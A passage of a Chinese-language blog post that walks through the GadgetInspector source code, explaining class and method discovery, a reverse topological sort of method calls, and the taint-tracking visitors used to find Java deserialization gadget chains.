&#123;</span><br><span class="line">        LOGGER.error(<span class="string">&quot;Exception analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">      e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>gadgetinspector.ClassResourceEnumerator#getAllClasses</code>，首先里面调用了*getRuntimeClasses()*函数</p><p>可以看到核心代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">URL stringClassUrl = Object.class.getResource(<span class="string">&quot;String.class&quot;</span>);</span><br><span class="line">URLConnection connection = stringClassUrl.openConnection();</span><br><span class="line">Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"><span class="keyword">if</span> (connection <span class="keyword">instanceof</span> JarURLConnection) &#123;</span><br><span class="line">  URL runtimeUrl = ((JarURLConnection) connection).getJarFileURL();</span><br><span class="line">  URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;runtimeUrl&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">    result.add(<span class="keyword">new</span> ClassLoaderClassResource(classLoader, classInfo.getResourceName()));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>他先获取JDK内部的String类的路径，加载String类的同时，类加载器还会将rt.jar的全部类一起加载，最后将rt.jar当中的所有类加入到ClassResource类型的result并且返回</p><p>之后也就是一个继承了ClassVisitor的MethodDiscoveryClassVisitor分别在visitMethod和visitEnd依次添加方法和类到缓存</p><p>之后就是调用save方法保存到文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">//保存和读取使用Factory实现</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//classes.dat数据格式：</span></span><br><span class="line">    <span class="comment">//类名(例：java/lang/String) 父类 接口A,接口B,接口C 是否接口 字段1!字段1access!字段1类型!字段2!字段2access!字段1类型</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;classes.dat&quot;</span>), <span class="keyword">new</span> ClassReference.Factory(), discoveredClasses);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//methods.dat数据格式：</span></span><br><span class="line">    <span class="comment">//类名 方法名 方法描述 是否静态方法</span></span><br><span class="line">    DataLoader.saveData(Paths.get(<span class="string">&quot;methods.dat&quot;</span>), <span class="keyword">new</span> MethodReference.Factory(), discoveredMethods);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//形成 类名(ClassReference.Handle)-&gt;类(ClassReference) 的映射关系</span></span><br><span class="line">    Map&lt;ClassReference.Handle, ClassReference&gt; classMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (ClassReference clazz : discoveredClasses) &#123;</span><br><span class="line">        classMap.put(clazz.getHandle(), clazz);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//保存classes.dat和methods.dat的同时，对所有的class进行递归整合，得到集合&#123;class:[subclass]&#125;，</span></span><br><span class="line">    <span class="comment">// 递归寻找class的父类、超类或实现的接口类，保存至inheritanceMap.dat</span></span><br><span class="line">    InheritanceDeriver.derive(classMap).save();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="PassthroughDiscovery"><a href="#PassthroughDiscovery" class="headerlink" title="PassthroughDiscovery"></a>PassthroughDiscovery</h3><p>这个类用来寻找函数的第几个参数能控制返回值：</p><p>0代表this、1-n分别代表第几个函数当中的形参</p><p>我们主要来关注gadgetinspector.PassthroughDiscovery#discover，先简单看看逻辑</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator, <span class="keyword">final</span> GIConfig config)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">  <span class="comment">//加载文件记录的所有方法信息</span></span><br><span class="line">  Map&lt;MethodReference.Handle, MethodReference&gt; methodMap = DataLoader.loadMethods();</span><br><span class="line">  <span class="comment">//加载文件记录的所有类信息</span></span><br><span class="line">  Map&lt;ClassReference.Handle, ClassReference&gt; classMap = DataLoader.loadClasses();</span><br><span class="line">  <span class="comment">//加载文件记录的所有类继承、实现关联信息</span></span><br><span class="line">  InheritanceMap inheritanceMap = InheritanceMap.load();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//搜索方法间的调用关系，缓存至methodCalls集合，返回 类名-&gt;类资源 映射集合</span></span><br><span class="line">  Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourceByName = discoverMethodCalls(classResourceEnumerator);</span><br><span class="line">  <span class="comment">//对方法调用关系进行字典排序</span></span><br><span class="line">  List&lt;MethodReference.Handle&gt; sortedMethods = topologicallySortMethodCalls();</span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * classResourceByName：类资源集合</span></span><br><span class="line"><span class="comment">         * classMap：类信息集合</span></span><br><span class="line"><span class="comment">         * inheritanceMap：继承、实现关系集合</span></span><br><span class="line"><span class="comment">         * sortedMethods：方法集合</span></span><br><span class="line"><span class="comment">         * SerializableDecider：决策者</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">  passthroughDataflow = calculatePassthroughDataflow(classResourceByName, classMap, inheritanceMap, sortedMethods,</span><br><span class="line">                                                     config.getSerializableDecider(methodMap, inheritanceMap));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跳过加载文件的部分，我们来看gadgetinspector.PassthroughDiscovery#discoverMethodCalls</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> Map&lt;String, ClassResourceEnumerator.ClassResource&gt; discoverMethodCalls(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    Map&lt;String, ClassResourceEnumerator.ClassResource&gt; classResourcesByName = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123;</span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(in);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                MethodCallDiscoveryClassVisitor visitor = <span class="keyword">new</span> MethodCallDiscoveryClassVisitor(Opcodes.ASM6);</span><br><span class="line">                cr.accept(visitor, ClassReader.EXPAND_FRAMES);</span><br><span class="line">                classResourcesByName.put(visitor.getName(), classResource);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Error analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> classResourcesByName;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很相似直接跟进<em>MethodCallDiscoveryClassVisitor</em>，其中重要的是<code>gadgetinspector.PassthroughDiscovery.MethodCallDiscoveryClassVisitor#visitMethod</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> MethodVisitor <span class="title">visitMethod</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,</span></span></span><br><span class="line"><span class="params"><span class="function">                                 String signature, String[] exceptions)</span> </span>&#123;</span><br><span class="line">  MethodVisitor mv = <span class="keyword">super</span>.visitMethod(access, name, desc, signature, exceptions);</span><br><span class="line">  <span class="comment">//在visit每个method的时候，创建MethodVisitor对method进行观察</span></span><br><span class="line">  MethodCallDiscoveryMethodVisitor modelGeneratorMethodVisitor = <span class="keyword">new</span> MethodCallDiscoveryMethodVisitor(</span><br><span class="line">    api, mv, <span class="keyword">this</span>.name, name, desc);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> JSRInlinerAdapter(modelGeneratorMethodVisitor, access, name, desc, signature, exceptions);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在MethodCallDiscoveryMethodVisitor内重写了MethodCallDiscoveryMethodVisitor的visitMethodInsn方法，也就是在方法内调用其他方法时，会把方法的相关信息缓存到calledMethods</p><p>并且这个calledMethods之前在MethodCallDiscoveryMethodVisitor的初始化构造函数当中将calledMethods的引用也放到了类的成员变量methodCalls当中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">MethodCallDiscoveryMethodVisitor</span><span class="params">(<span class="keyword">final</span> <span class="keyword">int</span> api, <span class="keyword">final</span> MethodVisitor mv,</span></span></span><br><span class="line"><span class="params"><span class="function">                                        <span class="keyword">final</span> String owner, String name, String desc)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>(api, mv);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建calledMethod收集调用到的method，最后形成集合&#123;&#123;sourceClass,sourceMethod&#125;:[&#123;targetClass,targetMethod&#125;]&#125;</span></span><br><span class="line">  <span class="keyword">this</span>.calledMethods = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">  methodCalls.put(<span class="keyword">new</span> MethodReference.Handle(<span class="keyword">new</span> ClassReference.Handle(owner), name, desc), calledMethods);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是最重要的逆拓扑排序topologicallySortMethodCalls，这个步骤对于我们之后污点跟踪非常重要，可以看看知道<a href="https://paper.seebug.org/1034/">创宇404的文章</a>非常好，这里为了文章清晰将直接复制相关部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;MethodReference.Handle&gt; topologicallySortMethodCalls() &#123;</span><br><span class="line">  Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">  <span class="keyword">for</span> (Map.Entry&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; entry : methodCalls.entrySet()) &#123;</span><br><span class="line">    MethodReference.Handle method = entry.getKey();</span><br><span class="line">    outgoingReferences.put(method, <span class="keyword">new</span> HashSet&lt;&gt;(entry.getValue()));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Topological sort methods</span></span><br><span class="line">  LOGGER.debug(<span class="string">&quot;Performing topological sort...&quot;</span>);</span><br><span class="line">  Set&lt;MethodReference.Handle&gt; dfsStack = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">  Set&lt;MethodReference.Handle&gt; visitedNodes = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">  List&lt;MethodReference.Handle&gt; sortedMethods = <span class="keyword">new</span> ArrayList&lt;&gt;(outgoingReferences.size());</span><br><span class="line">  <span class="keyword">for</span> (MethodReference.Handle root : outgoingReferences.keySet()) &#123;</span><br><span class="line">    <span class="comment">//遍历集合中的起始方法，进行递归搜索DFS，通过逆拓扑排序，调用链的最末端排在最前面，</span></span><br><span class="line">    <span class="comment">// 这样才能实现入参、返回值、函数调用链之间的污点影响</span></span><br><span class="line">    dfsTsort(outgoingReferences, sortedMethods, visitedNodes, dfsStack, root);</span><br><span class="line">  &#125;</span><br><span class="line">  LOGGER.debug(String.format(<span class="string">&quot;Outgoing references %d, sortedMethods %d&quot;</span>, outgoingReferences.size(), sortedMethods.size()));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sortedMethods;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在代码当中，首先有三个重要的变量</p><ul><li>dfsStack：用来分析方法调用顺序，保证在逆拓扑时候不形成环</li><li>visitedNodes：访问过的结点，在一条调用链出现重合的时候，不会造成重复的排序</li><li>sortedMethods：最终逆拓扑排序出来的结果</li></ul><p>接下来我们详细看看dfsTsort，可以看到是一个递归的过程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dfsTsort</span><span class="params">(Map&lt;MethodReference.Handle, Set&lt;MethodReference.Handle&gt;&gt; outgoingReferences,</span></span></span><br><span class="line"><span class="params"><span class="function">                             List&lt;MethodReference.Handle&gt; sortedMethods, Set&lt;MethodReference.Handle&gt; visitedNodes,</span></span></span><br><span class="line"><span class="params"><span class="function">                             Set&lt;MethodReference.Handle&gt; stack, MethodReference.Handle node)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (stack.contains(node)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (visitedNodes.contains(node)) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//根据起始方法，取出被调用的方法集</span></span><br><span class="line">  Set&lt;MethodReference.Handle&gt; outgoingRefs = outgoingReferences.get(node);</span><br><span class="line">  <span class="keyword">if</span> (outgoingRefs == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//入栈，以便于递归不造成类似循环引用的死循环整合</span></span><br><span class="line">  stack.add(node);</span><br><span class="line">  <span class="keyword">for</span> (MethodReference.Handle child : outgoingRefs) &#123;</span><br><span class="line">    dfsTsort(outgoingReferences, sortedMethods, visitedNodes, stack, child);</span><br><span class="line">  &#125;</span><br><span class="line">  stack.remove(node);</span><br><span class="line">  visitedNodes.add(node);<span class="comment">//记录已被探索过的方法，用于在上层调用遇到重复方法时可以跳过</span></span><br><span class="line">  sortedMethods.add(node);<span class="comment">//递归完成的探索，会添加进来</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了防止在逆拓扑排序形成环，对于待分析的方法，如果在stack里面，则不再入栈了，如果之前已经分析过某方法，也不会再入栈，之后取出被调用的子方法集，遍历这个子方法集递归调用dfsTsort，最后将结果保存到sortedMethods</p><p>比较形象的过程看创宇里的图，配合理解代码就不难了</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/2.png"></p><p>对上图进行逆拓扑排序（DFS方式）：</p><p>从med1开始，先将med1加入stack中，此时stack、visited、sortedmethods状态如下：</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/3.png"></p><p>med1还有子方法？有，继续深度遍历。将med2放入stack，此时的状态：</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/4.png"></p><p>med3有子方法吗？有，继续深度遍历。将med7放入stack，此时的状态：</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/5.png-w331s"></p><p>med7有子方法吗？没有，从stack中弹出med7并加入visited和sortedmethods，此时的状态：</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/6.png-w331s"></p><p>回溯到上一层，med3还有其他子方法吗？有，med8，将med8放入stack，此时的状态：</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/7.png-w331s"></p><p>med8还有子方法吗？没有，弹出stack，加入visited与sortedmethods，此时的状态：</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/8.png-w331s"></p><p>回溯到上一层，med3还有其他子方法吗？没有了，弹出stack，加入visited与sortedmethods，此时的状态：</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/9.png-w331s"></p><p>一直类似上面的过程，得到最终结果：med7、med8、med3、med6、med2、med4、med1</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/10.png-w331s"></p><p>之后的过程就是调用calculatePassthroughDataflow，其中遍历了sortedmethods，并通过字节码分析，生成了方法返回值与参数关系的passthrough数据流(passthroughDataflow主要负责存储参数污染结果，key对应方法名，value对应的是这个方法中可以被污染的参数索引集合)，内置了三种反序列化的策略配置config类：JDK、Jackson、Xstream，这里我只分析默认的JDK反序列化，其他过程都是类似的，继续回到正题</p><p>，ok还是为了减少干扰，我又在函数逻辑稍作修改，因为上文提到过我们跟踪的代码是</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> yyds;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">main</span><span class="params">(String args)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String cmd = <span class="keyword">new</span> A().method1(args);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> B().method2(cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method1</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method2</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> C().method3(param);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method3</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>肉眼可得与构造函数无关，接下来我们具体看看函数<code>calculatePassthroughDataflow</code>做了些什么</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/11.png"></p><p>根据代码逻辑我们可以看出首先会跳过静态初始化代码(因为静态代码块不出意外基本上是没法被污染的)</p><p>接下来在遍历的每个方法时，会先获取它的所属类，传入函数<code>PassthroughDataflowClassVisitor</code>进行ASM访问者模式的分析，这里我们依然重点关注的是visitMethod函数，这里首先需要目标是需要观察的method，否则跳过<img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/12.png"></p><p>之后会传入<code>PassthroughDataflowMethodVisitor</code>做进一步的处理，在<code>JSRInlinerAdapter</code>的最后执行<code>visitEnd</code>会触发这个观察过程，猜测这样做的目的是便于筛选，便于观察目的类</p><p>那么我们来具体看看这个<code>PassthroughDataflowMethodVisitor</code>类，首先它是继承于父类<code>TaintTrackingMethodVisitor</code>,首先是<code>visitCode</code>函数，很简单就是为了模拟本地变量表和操作数栈的变化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">super</span>.visitCode();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> localIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">this</span>.access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">//非静态方法，第一个局部变量应该为对象实例this</span></span><br><span class="line">    <span class="comment">//添加到本地变量表集合</span></span><br><span class="line">    setLocalTaint(localIndex, argIndex);</span><br><span class="line">    localIndex += <span class="number">1</span>;</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (Type argType : Type.getArgumentTypes(desc)) &#123;</span><br><span class="line">    <span class="comment">//判断参数类型，得出变量占用空间大小，然后存储</span></span><br><span class="line">    setLocalTaint(localIndex, argIndex);</span><br><span class="line">    localIndex += argType.getSize();</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后的visitInsn方法(每当访问无操作数的指令，例如nop，duo等等，ASM都会调用这个方法，这里我们只需要关注返回值的部分lol)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visitInsn</span><span class="params">(<span class="keyword">int</span> opcode)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(opcode) &#123;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.IRETURN:<span class="comment">//从当前方法返回int</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.FRETURN:<span class="comment">//从当前方法返回float</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.ARETURN:<span class="comment">//从当前方法返回对象引用</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">0</span>));<span class="comment">//栈空间从内存高位到低位分配空间</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.LRETURN:<span class="comment">//从当前方法返回long</span></span><br><span class="line">        <span class="keyword">case</span> Opcodes.DRETURN:<span class="comment">//从当前方法返回double</span></span><br><span class="line">            returnTaint.addAll(getStackTaint(<span class="number">1</span>));</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> Opcodes.RETURN:<span class="comment">//从当前方法返回void</span></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">super</span>.visitInsn(opcode);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后还有个重要的就是<code>visitMethodInsn</code>(在方法体内，调用了其他方法，都会触发这个方法的调用)，这里逻辑也不难但是为了梳理逻辑这里先不谈，之后我们以开题提到的代码来做讲解</p><p>首先可以看到逆拓扑排序的结果以及可被污染的位置，<img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/13.png"></p><p>那么具体跟入这个过程分析</p><p>第一步，首先是对<code>C.method3</code>进行观察，节约纸张不废话，首先是到<code>gadgetinspector.PassthroughDiscovery.PassthroughDataflowClassVisitor#visitMethod</code>筛选目标类，之后传入到<code>PassthroughDataflowMethodVisitor</code>当中做进一步的观察，由于method3方法体比较简单，只是返回传入的参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">method3</span><span class="params">(String param)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> param;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于在方法体内字节码操作了变量，因此会调用<code>visitVarInsn</code>，也就是在<code>gadgetinspector.TaintTrackingMethodVisitor#visitVarInsn</code>，在这里返回变量触发了aload操作指令，这里会将返回参数对应的本地变量推送至栈顶</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/14.png"></p><p>之后对应的ARETURN指令会触发调用<code>gadgetinspector.PassthroughDiscovery.PassthroughDataflowMethodVisitor#visitInsn</code>，这里将污染的变量保存到<code>returnTaint</code>变量当中，这里返回long和double的和上面不一样主要是因为它们占两个位置</p><p><img src="/2022/05/09/year/2022/5/GadgetInspector%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/15.png"></p><p>至此我们的第一步method3也就结束了，之后就是将其缓存到passthroughDataflow当中</p><p><img 